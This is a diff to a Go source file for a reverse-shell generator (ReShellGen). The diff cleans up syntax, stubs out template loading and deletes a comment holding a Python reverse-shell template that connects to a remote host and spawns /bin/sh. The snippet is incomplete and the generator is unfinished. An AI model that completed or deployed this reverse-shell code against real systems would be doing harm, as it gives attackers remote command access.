@@ -5,11 +5,7 @@ import (
 	"os"
 )
 
-
-/**
-	Error handler
-**/
-
+// ShellError represents an error with the shell
 type ShellError struct {
 	msg string
 	err string
@@ -29,7 +25,7 @@ func (e *ShellError) Error() string {
 	rport: Remote port -> The port the shell will connect to
 
 */
-func ReShellGen(lang string, rhost string, rport int) (string, error){
+func ReShellGen(lang string, rhost string, rport int) (string, error) {
 
 	// todo: lang.toLower() - set lang to lowercase letters?
 	if lang == "python2" {
@@ -48,23 +44,11 @@ func ReShellGen(lang string, rhost string, rport int) (string, error){
 	return "Ehm", &ShellError{}
 }
 
-func loadTemplate(lang string) (error) { // return what?
-	file, err := os.Open(("templates/shell_" + lang))
-	if err != nil:
+func loadTemplate(lang string) error {
+	file, err := os.Open("templates/shell_" + lang)
+	if err != nil {
 		return err
+	}
 
-	contents = []
+	return nil
 }
-
-/** TEMPLATES: **
-Python(2) - Linux (exec: "bin/sh"):
-import socket, subprocess, os
-s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((rhost, rport))
-p=subprocess.call(["/bin/sh", "-i"])
-
-Python(3) - TODO:
-*insert shell template here :D*
-
-
-****************/
